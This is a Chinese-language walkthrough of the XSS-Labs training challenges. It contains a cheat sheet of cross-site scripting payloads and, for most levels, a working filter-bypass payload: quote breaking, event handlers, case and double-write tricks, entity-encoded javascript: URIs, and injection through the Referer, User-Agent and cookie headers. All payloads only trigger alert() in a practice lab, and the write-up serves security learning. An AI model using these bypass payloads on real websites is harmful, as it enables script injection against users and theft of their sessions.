---
title: Xss-Labs通过文档
author: Kilm0r
description: "xss注入备忘录"
pubDate: 2025-06-06
tags: ["安全", "xss", "渗透"]
---

<h1 id="Exg7d">常用payload：</h1>

```javascript
<script>alert("xss")</script>

<body onload=alert()>

<img src=x onerror=alert()>

<svg onload=alert()>

<body onpageshow=alert(1)>

<div style="width:1000px;height:1000px" onmouseover=alert()></div>

<marquee width=10 loop=2 behavior="alternate" onbounce=alert()> (firefox only)

<marquee onstart=alert(1)> (firefox only)

<marquee loop=1 width=0 onfinish=alert(1)> (firefox only)

<input autofocus="" onfocus=alert(1)></input>

<details open ontoggle="alert()">  (chrome & opera only)
```

<h2 id="J5B4V">开局：</h2>

![](https://memme.cn/images/page-meta/en/1.png)

<h1 id="lG3OP">第一关：</h1>

![](https://memme.cn/images/page-meta/en/2.png)

![](https://memme.cn/images/page-meta/en/3.png)

<h1 id="Ee92T">第二关：</h1>

![](https://memme.cn/images/page-meta/en/4.png)

![](https://memme.cn/images/page-meta/en/5.png)

闭合前后尖括号使js代码生效

"><script>alert("s")</script><"

![](https://memme.cn/images/page-meta/en/6.png)

<h1 id="dxW5y">第三关：</h1>

![](https://memme.cn/images/page-meta/en/7.png)

括号被实体化，尝试更改其他方式代替,<font style="color:rgb(77, 77, 77);">但是htmlspecialchars函数只针对<>（即大于小于号）进行html实体化，我们还可以利用其他方法进行xss注入</font>

```javascript
" onfocus=javascript:alert() "
```

<font style="color:rgb(77, 77, 77);">  
</font><font style="color:rgb(77, 77, 77);"> </font>

![](https://memme.cn/images/page-meta/en/8.png)

<h1 id="BqiRB">第四关：</h1>

![](https://memme.cn/images/page-meta/en/9.png)

![](https://memme.cn/images/page-meta/en/10.png)

括号被实体化，尝试用其他方法绕过，不使用括号

" onfocus=javascript:alert() "

![](https://memme.cn/images/page-meta/en/11.png)

<h1 id="nk27O">第五关：</h1>
先用常规语句试探下

```javascript
<script>alert("xss")</script>
```

![](https://memme.cn/images/page-meta/en/12.png)



![](https://memme.cn/images/page-meta/en/12.png)

源码处发现使用str_replace函数，<script>转换为<scr_ipt> on转换为o_n

使用a标签绕过script与on标签

```javascript
""/><a href=javascript:alert()>a-alert</a><""
```

![](https://memme.cn/images/page-meta/en/13.png)

<h1 id="BKN09">第六关：</h1>
![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748693701767-90ca1802-b407-4f97-8137-a30fbc7bf788.png)

使用常规语句：<script>alert("xss")</script>试探下

![](https://memme.cn/images/page-meta/en/14.png)

源码处的得知script、on、src、data、href被过滤，a标签 script标签不能用

这里可以使用大小写绕过

"><Script>alert("AA")</SCRipt><"

![](https://memme.cn/images/page-meta/en/15.png)

<h1 id="DkcjH">Level 7</h1>

![](https://memme.cn/images/page-meta/en/16.png)

源码处得知使用strtolower输入被小写，防止大写字母绕过，script、on、src、data、href被过滤

"><SCRscriptIPT>alert("aa")</Scrscriptipt><"

这里我们使用双写绕过，删掉中间标签的同时剩下的标签还能组成新的标签

![](https://memme.cn/images/page-meta/en/17.png)

<h1 id="BGo1C">level 8</h1>

![](https://memme.cn/images/page-meta/en/18.png)

![](https://memme.cn/images/page-meta/en/19.png)

源码处得知过滤新增了“引号

这里绕过可以使用<font style="color:rgb(77, 77, 77);">href的隐藏属性自动Unicode解码，我们可以插入一段js伪协议</font>

![](https://memme.cn/images/page-meta/en/20.png)

```javascript
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#41;
```

![](https://memme.cn/images/page-meta/en/21.png)

<h1 id="Cdj7L">level 9</h1>

![](https://memme.cn/images/page-meta/en/22.png)

![](https://memme.cn/images/page-meta/en/23.png)

源码处得知不仅过滤了标签script、on、src、data、href、“双引号的同时还增加了判断，判断链接地址是否存在http://

<font style="color:rgb(77, 77, 77);">为了防止false===false，我们需要向传入的值里面添加http://，而且要用注释符注释掉，否则会执行不了、无法弹窗，让函数strpos返回一个数字，构造payload</font>

```javascript
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#41;/* http:// */
```

<font style="color:rgb(77, 77, 77);">  
</font><font style="color:rgb(77, 77, 77);"> </font>

![](https://memme.cn/images/page-meta/en/24.png)

<h1 id="aDtkD">Level 10</h1>

![](https://memme.cn/images/page-meta/en/25.png)

![](https://memme.cn/images/page-meta/en/26.png)

源码处得知过滤掉<> <font style="color:rgb(77, 77, 77);">所以我们用onfocus事件，因为这里输入框被隐藏了，需要添加type="text"，构造payload</font>

```javascript
?t_sort=" onfocus=javascript:alert() type="text
```

![](https://memme.cn/images/page-meta/en/27.png)

<h1 id="RTNrK">Level 11</h1>

![](https://memme.cn/images/page-meta/en/28.png)

![](https://memme.cn/images/page-meta/en/29.png)

源码处得知，接收http头信息，同时过滤<>

在头部http_refere部分插入xss代码

![](https://memme.cn/images/page-meta/en/30.png)

<h1 id="J7KcJ">Level 12</h1>

![](https://memme.cn/images/page-meta/en/31.png)

源码处得知接收http_user_agent浏览器信息，同时过滤<>

我们继续同上方法插入UA头信息测试

```javascript
" onfocus=javascript:alert() type="text
```

![](https://memme.cn/images/page-meta/en/33.png)

<h1 id="HRe86">Level 13</h1>

![](https://memme.cn/images/page-meta/en/34.png)

![](https://memme.cn/images/page-meta/en/35.png)

源码处得知接收俩个参数keyword与t_sort同时过滤<>,使用$\_COOKIE["user"]，接收浏览器cookie信息
，同上继续使用onfocus函数，插入cookie位置

```javascript
" onfocus=javascript:alert() type="text
```

<h1 id="SHLf9">level 14</h1>

![](https://memme.cn/images/page-meta/en/36.png)

这关目前做不了，含义为跳转该网站，在该网站上传存在xss代码图片，跳转到该网站后弹窗，目前该网站已经关闭，本关略过

<h1 id="Y25Dr">Level 15</h1>

![](https://memme.cn/images/page-meta/en/37.png)

输出使用ng-include函数包含，可以包含其他文件，这里包含第一个通关文件，之后在第一个文件弹窗

![](https://memme.cn/images/page-meta/en/38.png)

```python
?src='level1.php?name=<img src=XXX onmouseover=alert()>'
```

![](https://memme.cn/images/page-meta/en/39.png)

<h1 id="cUxQZ">Level 16</h1>

![](https://memme.cn/images/page-meta/en/40.png)

源码出得知，是替换script、“、/等符号，

<font style="color:rgb(77, 77, 77);">空格可以用回车来代替绕过，回车的url编码是%0a，再配合上不用/的<img>、<details>、<svg>等标签</font>

![](https://memme.cn/images/page-meta/en/41.png)
